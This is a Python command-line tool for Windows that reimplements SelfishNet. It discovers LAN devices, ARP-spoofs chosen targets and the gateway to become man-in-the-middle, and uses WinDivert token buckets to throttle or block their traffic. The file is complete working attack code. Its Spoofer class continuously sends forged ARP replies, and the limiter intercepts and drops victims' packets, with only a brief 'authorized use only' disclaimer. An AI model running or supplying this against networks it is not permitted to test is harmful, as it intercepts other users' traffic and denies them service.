#!/usr/bin/env python3
"""
SelfishNet CLI - LAN bandwidth control for Windows.

A small, script-based reimplementation of SelfishNet v3's core function:
discover LAN devices, ARP-spoof selected targets to become man-in-the-middle,
and rate-limit or block their traffic per device.

Data path:
  * Scapy + Npcap  -> device discovery and ARP spoofing (layer 2).
  * Windows IP forwarding (kernel) -> keeps spoofed victims online at line rate.
  * WinDivert (pydivert) -> intercepts forwarded packets and applies a per-device
    token bucket: forward while under budget, drop when over. Block = budget 0.

Windows-only. Requires: Npcap installed, `pip install scapy pydivert`, admin rights.

Authorized use only: run this against your own LAN or a network you are
explicitly permitted to test. ARP spoofing is disruptive by design.

Examples:
  # List devices on the LAN and exit
  python selfishnet.py --scan

  # Cap 192.168.1.42 to 500 kbps down / 200 kbps up until Ctrl-C
  python selfishnet.py --limit 192.168.1.42:500:200

  # Cap one device's download only (upload unlimited), block another, for 10 min
  python selfishnet.py --limit 192.168.1.42:500: --block 192.168.1.77 --duration 600
"""

import argparse
import ctypes
import platform
import subprocess
import sys
import threading
import time

# Scapy is required for discovery + spoofing on every code path.
from scapy.all import (
    ARP, Ether, srp, send, conf, get_if_addr, get_if_hwaddr, getmacbyip,
)

# pydivert (WinDivert) is only needed when we actually rate-limit. Import lazily
# so `--scan` works even if WinDivert isn't present yet.
try:
    import pydivert
except Exception:  # pragma: no cover - platform/driver dependent
    pydivert = None


# Cap sentinels used throughout: None = unlimited, 0 = block, >0 = kbps.
UNLIMITED = None
BLOCK = 0


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def is_admin():
    """True if running elevated (Windows) / as root (fallback)."""
    if platform.system() == "Windows":
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    try:
        import os
        return os.geteuid() == 0
    except Exception:
        return False


def iface_name():
    """Best-effort friendly interface name (e.g. 'Wi-Fi') for netsh."""
    try:
        return conf.iface.name  # scapy NetworkInterface object
    except Exception:
        return str(conf.iface)


def default_gateway():
    """Default gateway IP from the routing table via scapy."""
    try:
        return conf.route.route("0.0.0.0")[2]
    except Exception:
        return None


def local_cidr():
    """Guess the local /24 from this host's IP (good enough for a LAN tool)."""
    ip = get_if_addr(conf.iface)
    if not ip or ip == "0.0.0.0":
        return None
    return ip.rsplit(".", 1)[0] + ".0/24"


def kbps_to_bytes(kbps):
    """Kilobits/sec -> bytes/sec."""
    return kbps * 1000 // 8


# --------------------------------------------------------------------------- #
# Discovery
# --------------------------------------------------------------------------- #
def scan(cidr, timeout=3):
    """ARP-scan `cidr`, returning a list of (ip, mac) tuples."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=cidr),
        timeout=timeout, retry=1, verbose=0, iface=conf.iface,
    )
    seen = {}
    for _, reply in ans:
        seen[reply.psrc] = reply.hwsrc
    return sorted(seen.items(), key=lambda kv: tuple(int(o) for o in kv[0].split(".")))


def print_devices(devices, gateway):
    print(f"\n{'IP':<16}{'MAC':<20}{'Note':<10}")
    print("-" * 46)
    for ip, mac in devices:
        note = "gateway" if ip == gateway else ""
        print(f"{ip:<16}{mac:<20}{note:<10}")
    print(f"\n{len(devices)} device(s) found.\n")


# --------------------------------------------------------------------------- #
# Rate limiting
# --------------------------------------------------------------------------- #
class TokenBucket:
    """Classic token bucket. rate<=0 means block (never allow)."""

    def __init__(self, rate_bytes_per_s):
        self.rate = rate_bytes_per_s
        # Allow at least a couple of MTUs of burst so tiny caps still pass
        # single packets and the average stays close to the target rate.
        self.capacity = max(rate_bytes_per_s, 3000)
        self.tokens = float(self.capacity)
        self.last = time.monotonic()

    def allow(self, nbytes):
        if self.rate <= 0:
            return False
        now = time.monotonic()
        self.tokens = min(self.capacity, self.tokens + (now - self.last) * self.rate)
        self.last = now
        if self.tokens >= nbytes:
            self.tokens -= nbytes
            return True
        return False


def build_buckets(targets):
    """
    targets: dict ip -> (down_cap, up_cap) with cap in {None, 0, kbps>0}.
    Returns (down_buckets, up_buckets): ip -> TokenBucket, unlimited omitted.
    """
    down, up = {}, {}
    for ip, (d, u) in targets.items():
        if d is not UNLIMITED:
            down[ip] = TokenBucket(kbps_to_bytes(d) if d else 0)
        if u is not UNLIMITED:
            up[ip] = TokenBucket(kbps_to_bytes(u) if u else 0)
    return down, up


def limiter_loop(down_buckets, up_buckets, stop_event, verbose=False):
    """
    WinDivert forward-layer loop. Traffic *to* a target = download,
    *from* a target = upload. Forward when under budget, else drop.
    """
    if pydivert is None:
        raise RuntimeError(
            "pydivert (WinDivert) is not available. Install it with "
            "`pip install pydivert` on the Windows host."
        )

    # Only inspect packets involving a target; keeps the hot path cheap.
    ips = set(down_buckets) | set(up_buckets)
    flt = " or ".join(f"ip.SrcAddr == {ip} or ip.DstAddr == {ip}" for ip in ips)

    dropped = forwarded = 0
    with pydivert.WinDivert(flt, layer=pydivert.Layer.NETWORK_FORWARD) as w:
        for packet in w:
            if stop_event.is_set():
                break
            nbytes = len(packet.raw)
            db = down_buckets.get(packet.dst_addr)   # inbound to victim
            ub = up_buckets.get(packet.src_addr)     # outbound from victim
            allow = True
            if db is not None and not db.allow(nbytes):
                allow = False
            elif ub is not None and not ub.allow(nbytes):
                allow = False
            if allow:
                w.send(packet)
                forwarded += 1
            else:
                dropped += 1
            if verbose and (forwarded + dropped) % 500 == 0:
                print(f"  [limiter] forwarded={forwarded} dropped={dropped}", end="\r")


# --------------------------------------------------------------------------- #
# Spoofing
# --------------------------------------------------------------------------- #
class Spoofer(threading.Thread):
    """Continuously poisons each target <-> gateway until stopped."""

    def __init__(self, targets_macs, gateway_ip, gateway_mac, my_mac, interval=2.0):
        super().__init__(daemon=True)
        self.targets = targets_macs          # ip -> mac
        self.gw_ip = gateway_ip
        self.gw_mac = gateway_mac
        self.my_mac = my_mac
        self.interval = interval
        self.stop_event = threading.Event()

    def _poison(self):
        for ip, mac in self.targets.items():
            # Tell the victim that the gateway is at our MAC.
            send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.my_mac),
                 verbose=0, iface=conf.iface)
            # Tell the gateway that the victim is at our MAC.
            send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=self.my_mac),
                 verbose=0, iface=conf.iface)

    def run(self):
        while not self.stop_event.is_set():
            self._poison()
            self.stop_event.wait(self.interval)

    def restore(self, rounds=4):
        """Heal the poisoned ARP caches with the real MAC mappings."""
        for _ in range(rounds):
            for ip, mac in self.targets.items():
                send(ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gw_ip, hwsrc=self.gw_mac),
                     verbose=0, iface=conf.iface)
                send(ARP(op=2, pdst=self.gw_ip, hwdst=self.gw_mac, psrc=ip, hwsrc=mac),
                     verbose=0, iface=conf.iface)
            time.sleep(0.3)


# --------------------------------------------------------------------------- #
# Windows IP forwarding
# --------------------------------------------------------------------------- #
def set_forwarding(enable, iface):
    """
    Toggle transit forwarding so the kernel routes victim traffic (and it
    reaches the WinDivert forward layer). Per-interface netsh takes effect
    immediately; the registry key is a fallback that may need a reboot.
    """
    state = "enabled" if enable else "disabled"
    try:
        subprocess.run(
            ["netsh", "interface", "ipv4", "set", "interface",
             iface, f"forwarding={state}"],
            check=False, capture_output=True, text=True,
        )
    except FileNotFoundError:
        print("  [forward] netsh not found (are you on Windows?)")
        return
    print(f"  [forward] interface '{iface}' forwarding={state}")


# --------------------------------------------------------------------------- #
# CLI parsing
# --------------------------------------------------------------------------- #
def parse_limit(spec):
    """'IP:DOWN:UP' -> (ip, down, up). Empty field = unlimited, 0 = block."""
    parts = spec.split(":")
    if len(parts) != 3:
        raise argparse.ArgumentTypeError(
            f"--limit must be IP:DOWN:UP (kbps), got '{spec}'")
    ip, d, u = parts

    def cap(v):
        if v == "":
            return UNLIMITED
        try:
            n = int(v)
        except ValueError:
            raise argparse.ArgumentTypeError(f"bad rate '{v}' in '{spec}'")
        return BLOCK if n == 0 else n

    return ip, cap(d), cap(u)


def build_parser():
    p = argparse.ArgumentParser(
        description="SelfishNet CLI - LAN bandwidth control (Windows).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--scan", action="store_true", help="scan the LAN and exit")
    p.add_argument("--range", dest="cidr", help="scan range CIDR (default: local /24)")
    p.add_argument("--iface", help="interface friendly name for netsh (e.g. 'Wi-Fi')")
    p.add_argument("--gateway", help="override gateway IP (default: auto)")
    p.add_argument("--limit", dest="limits", action="append", type=parse_limit,
                   default=[], metavar="IP:DOWN:UP",
                   help="rate-limit a device, kbps; empty field=unlimited, 0=block")
    p.add_argument("--block", dest="blocks", action="append", default=[],
                   metavar="IP", help="block a device entirely (repeatable)")
    p.add_argument("--duration", type=int, help="auto-stop after N seconds")
    p.add_argument("--no-forward", action="store_true",
                   help="don't toggle Windows IP forwarding (do it yourself)")
    p.add_argument("-v", "--verbose", action="store_true", help="live counters")
    return p


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def run_session(targets, args, gateway):
    """Resolve MACs, enable forwarding, spoof, and run the limiter loop."""
    my_mac = get_if_hwaddr(conf.iface)
    gw_mac = getmacbyip(gateway)
    if not gw_mac:
        sys.exit(f"Could not resolve gateway MAC for {gateway}. Is it reachable?")

    target_macs = {}
    for ip in targets:
        mac = getmacbyip(ip)
        if not mac:
            print(f"  [warn] could not resolve MAC for {ip}; skipping")
            continue
        target_macs[ip] = mac
    if not target_macs:
        sys.exit("No resolvable targets. Nothing to do.")

    targets = {ip: caps for ip, caps in targets.items() if ip in target_macs}
    down_buckets, up_buckets = build_buckets(targets)

    print(f"\nGateway: {gateway} ({gw_mac})   You: {get_if_addr(conf.iface)} ({my_mac})")
    for ip, (d, u) in targets.items():
        fmt = lambda c: "unlimited" if c is UNLIMITED else ("BLOCK" if c == BLOCK else f"{c} kbps")
        print(f"  target {ip:<15} down={fmt(d):<12} up={fmt(u)}")

    iface = args.iface or iface_name()
    if not args.no_forward:
        set_forwarding(True, iface)

    spoofer = Spoofer(target_macs, gateway, gw_mac, my_mac)
    stop_event = threading.Event()
    spoofer.start()
    print("\nSpoofing + limiting. Press Ctrl-C to stop and restore.\n")

    if args.duration:
        threading.Timer(args.duration, stop_event.set).start()

    try:
        limiter_loop(down_buckets, up_buckets, stop_event, verbose=args.verbose)
    except KeyboardInterrupt:
        pass
    finally:
        print("\nRestoring network...")
        stop_event.set()
        spoofer.stop_event.set()
        spoofer.restore()
        if not args.no_forward:
            set_forwarding(False, iface)
        print("Done.")


def main():
    args = build_parser().parse_args()

    if args.iface:
        conf.iface = args.iface

    if args.scan:
        cidr = args.cidr or local_cidr()
        if not cidr:
            sys.exit("Could not determine local subnet; pass --range CIDR.")
        print(f"Scanning {cidr} ...")
        print_devices(scan(cidr), args.gateway or default_gateway())
        return

    if not args.limits and not args.blocks:
        build_parser().print_help()
        sys.exit("\nNothing to do: pass --scan, --limit, or --block.")

    if not is_admin():
        sys.exit("Administrator privileges required (Npcap + WinDivert need a driver).")

    gateway = args.gateway or default_gateway()
    if not gateway:
        sys.exit("Could not determine gateway; pass --gateway IP.")

    # Merge --limit and --block into one target map. --block wins (both dirs 0).
    targets = {}
    for ip, d, u in args.limits:
        targets[ip] = (d, u)
    for ip in args.blocks:
        targets[ip] = (BLOCK, BLOCK)

    run_session(targets, args, gateway)


if __name__ == "__main__":
    main()
